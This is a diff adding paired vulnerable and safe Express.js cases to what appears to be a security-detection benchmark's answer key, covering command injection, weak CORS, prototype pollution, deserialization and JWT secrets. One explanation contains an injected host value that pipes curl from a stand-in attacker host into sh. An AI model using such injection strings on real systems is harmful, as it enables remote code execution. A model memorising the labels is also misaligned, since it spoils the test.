@@ -265,6 +265,212 @@
       "kind": "safe",
       "pairedWith": "express-operations-log-query",
       "why": "The same ripgrep call passes the search term as the value of an explicit --regexp option and terminates option parsing with -- before the search root, so a term beginning with a dash is treated as pattern text and can never become a flag."
+    },
+    {
+      "id": "express-support-network-probe",
+      "family": "express",
+      "architecture": "Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses",
+      "language": "javascript",
+      "file": "express/network-probe.js",
+      "kind": "vulnerable",
+      "category": "command_injection",
+      "severityBand": ["high", "critical"],
+      "route": "POST /support/network/probe",
+      "line": 21,
+      "lineRange": [21, 21],
+      "runtimeVerifiable": true,
+      "why": "The host from the request body is interpolated into the script handed to `sh -c`, so a value such as \"example.com; curl attacker.example | sh\" runs as a second shell command with the application's privileges. Using spawn rather than exec does not help when the program spawned is a shell and the caller's text is its script."
+    },
+    {
+      "id": "express-support-network-trace",
+      "family": "express",
+      "language": "javascript",
+      "file": "express/network-trace.js",
+      "kind": "safe",
+      "pairedWith": "express-support-network-probe",
+      "why": "The same support probe spawns traceroute directly with a fixed argument array, so no shell parses the host, a `--` ends option parsing, and the host must match a hostname pattern before it is used."
+    },
+    {
+      "id": "express-dashboard-sign-in",
+      "family": "express",
+      "architecture": "Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses",
+      "language": "javascript",
+      "file": "express/sign-in.js",
+      "kind": "vulnerable",
+      "category": "missing_rate_limit_on_credentials",
+      "severityBand": ["low", "medium"],
+      "route": "POST /auth/sign-in",
+      "line": 13,
+      "lineRange": [13, 24],
+      "runtimeVerifiable": true,
+      "packageJson": {
+        "name": "dashboard-api",
+        "version": "1.0.0",
+        "dependencies": {
+          "express": "^4.21.2",
+          "bcrypt": "^5.1.1",
+          "cookie-parser": "^1.4.7",
+          "pg": "^8.13.1"
+        }
+      },
+      "why": "The password sign-in route checks a bcrypt hash on every request and nothing in the route or the project limits attempts: the manifest declares no rate limiter and the route has no throttling middleware, so an attacker can try passwords against any email as fast as the server answers."
+    },
+    {
+      "id": "express-dashboard-sign-in-throttled",
+      "family": "express",
+      "language": "javascript",
+      "file": "express/sign-in-throttled.js",
+      "kind": "safe",
+      "pairedWith": "express-dashboard-sign-in",
+      "packageJson": {
+        "name": "dashboard-api",
+        "version": "1.0.0",
+        "dependencies": {
+          "express": "^4.21.2",
+          "bcrypt": "^5.1.1",
+          "cookie-parser": "^1.4.7",
+          "express-rate-limit": "^7.4.1",
+          "pg": "^8.13.1"
+        }
+      },
+      "why": "The same sign-in route runs behind an express-rate-limit middleware that allows ten attempts per address per fifteen minutes, and the project declares that limiter."
+    },
+    {
+      "id": "express-app-shell-browser-origins",
+      "family": "express",
+      "architecture": "Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses",
+      "language": "javascript",
+      "file": "express/app-shell.js",
+      "kind": "vulnerable",
+      "category": "insecure_cors_configuration",
+      "severityBand": ["medium", "high"],
+      "line": 19,
+      "lineRange": [15, 20],
+      "runtimeVerifiable": true,
+      "why": "The origin callback approves every origin, and credentials are allowed, so the cors middleware reflects any requesting origin into Access-Control-Allow-Origin with Access-Control-Allow-Credentials: true. Any website a signed-in user visits can read this API's responses with the user's session cookie."
+    },
+    {
+      "id": "express-app-bootstrap-browser-origins",
+      "family": "express",
+      "language": "javascript",
+      "file": "express/app-bootstrap.js",
+      "kind": "safe",
+      "pairedWith": "express-app-shell-browser-origins",
+      "why": "The same credentialed CORS setup, but the origin callback approves only origins in a configured set (or a request with no Origin header), so a third-party site's request is not given credentialed access."
+    },
+    {
+      "id": "express-dashboard-layout-patch",
+      "family": "express",
+      "architecture": "Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses",
+      "language": "javascript",
+      "file": "express/widget-layout.js",
+      "kind": "vulnerable",
+      "category": "prototype_pollution",
+      "severityBand": ["medium", "high"],
+      "route": "PATCH /dashboards/:dashboardId/layout",
+      "line": 25,
+      "lineRange": [24, 25],
+      "runtimeVerifiable": true,
+      "why": "Both property names in the nested write come from the request body. A panel of \"__proto__\" makes layout[panel] resolve to Object.prototype, and the second write then sets an attacker-chosen property on every object in the process, which can change authorisation checks and option defaults elsewhere in the server."
+    },
+    {
+      "id": "express-dashboard-settings-patch",
+      "family": "express",
+      "language": "javascript",
+      "file": "express/widget-settings.js",
+      "kind": "safe",
+      "pairedWith": "express-dashboard-layout-patch",
+      "why": "The same nested write, but the panel and setting names must each be members of a fixed set of editor names, so neither can be __proto__, constructor or prototype."
+    },
+    {
+      "id": "express-guest-cart-restore",
+      "family": "express",
+      "architecture": "Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses",
+      "language": "javascript",
+      "file": "express/cart-restore.js",
+      "kind": "vulnerable",
+      "category": "unsafe_deserialization",
+      "severityBand": ["high", "critical"],
+      "route": "GET /cart",
+      "line": 20,
+      "lineRange": [20, 20],
+      "runtimeVerifiable": true,
+      "why": "The cart cookie is client-controlled and is decoded with Cryo, which rebuilds functions and prototypes from its input. A crafted cookie can carry a function that runs when the application touches the restored object, giving code execution on the server from an unauthenticated request."
+    },
+    {
+      "id": "express-guest-cart-summary",
+      "family": "express",
+      "language": "javascript",
+      "file": "express/cart-summary.js",
+      "kind": "safe",
+      "pairedWith": "express-guest-cart-restore",
+      "why": "The same guest cart cookie is decoded with JSON.parse, which cannot produce functions or prototypes, and each line is reduced to a string sku and a positive integer quantity before use."
+    },
+    {
+      "id": "express-revenue-report-filters",
+      "family": "express",
+      "architecture": "Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses",
+      "language": "javascript",
+      "file": "express/report-filters.js",
+      "kind": "vulnerable",
+      "category": "dependency_with_known_advisory",
+      "severityBand": ["medium", "high"],
+      "route": "POST /reports/revenue",
+      "line": 20,
+      "lineRange": [20, 20],
+      "runtimeVerifiable": true,
+      "packageJson": {
+        "name": "reporting-api",
+        "version": "1.0.0",
+        "dependencies": {
+          "express": "^4.21.2",
+          "lodash": "4.17.11",
+          "pg": "^8.13.1"
+        }
+      },
+      "why": "lodash is pinned at 4.17.11, inside the published advisory ranges for merge (prototype pollution, fixed in 4.17.12 and later), and the route calls _.merge with the request body's filters, which is exactly the function and the input those advisories describe."
+    },
+    {
+      "id": "express-subscription-report-columns",
+      "family": "express",
+      "language": "javascript",
+      "file": "express/report-columns.js",
+      "kind": "safe",
+      "pairedWith": "express-revenue-report-filters",
+      "packageJson": {
+        "name": "reporting-api",
+        "version": "1.0.0",
+        "dependencies": {
+          "express": "^4.21.2",
+          "lodash": "4.17.11",
+          "pg": "^8.13.1"
+        }
+      },
+      "why": "The same lodash 4.17.11 is installed, but the route only calls pick and includes, which no advisory affecting that version names, and each value is checked against a fixed list. The installed version is still worth upgrading, which belongs at the manifest rather than in this route."
+    },
+    {
+      "id": "express-personal-api-tokens",
+      "family": "express",
+      "architecture": "Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses",
+      "language": "javascript",
+      "file": "express/api-tokens.js",
+      "kind": "vulnerable",
+      "category": "jwt_weak_secret",
+      "severityBand": ["medium", "high"],
+      "route": "POST /tokens",
+      "line": 24,
+      "lineRange": [10, 24],
+      "runtimeVerifiable": true,
+      "why": "The signing key falls back to the literal \"changeme\" when API_TOKEN_SECRET is unset, so any deployment that misses the variable signs tokens with a key everyone can guess. An attacker who tries it can mint a token for any user and any scopes, offline."
+    },
+    {
+      "id": "express-personal-api-keys",
+      "family": "express",
+      "language": "javascript",
+      "file": "express/api-keys.js",
+      "kind": "safe",
+      "pairedWith": "express-personal-api-tokens",
+      "why": "The same token issuance, but the key comes only from the environment and the module refuses to load without a key of at least 32 characters, so there is no literal to guess."
     }
   ]
 }
